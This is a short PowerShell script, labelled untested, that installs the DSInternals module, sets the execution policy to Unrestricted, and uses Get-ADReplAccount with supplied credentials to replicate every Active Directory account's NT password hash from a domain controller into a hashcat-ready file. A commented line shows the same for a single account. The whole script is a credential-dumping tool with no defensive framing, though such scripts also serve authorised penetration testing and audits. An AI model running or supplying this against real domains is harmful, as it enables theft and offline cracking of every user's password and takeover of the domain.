# Replicates AD hashes
#
###### UNTESTED
#
$srv = ""

Set-ExecutionPolicy -ExecutionPolicy Unrestricted
Set-PSRepository -Name 'PSGallery' -InstallationPolicy Trusted

Install-Module -Name DSInternals

$creds = Get-Credential

Get-ADReplAccount -All -Credential $creds -Server $srv -Protocol TCP | Format-Custom -View HashcatNT | Out-File hashes.txt -Encoding utf8

# Replicate a single account
# Get-ADReplAccount -SamAccountName $username -Domain $domain -Server $server -Credential $creds -Protocol TCP
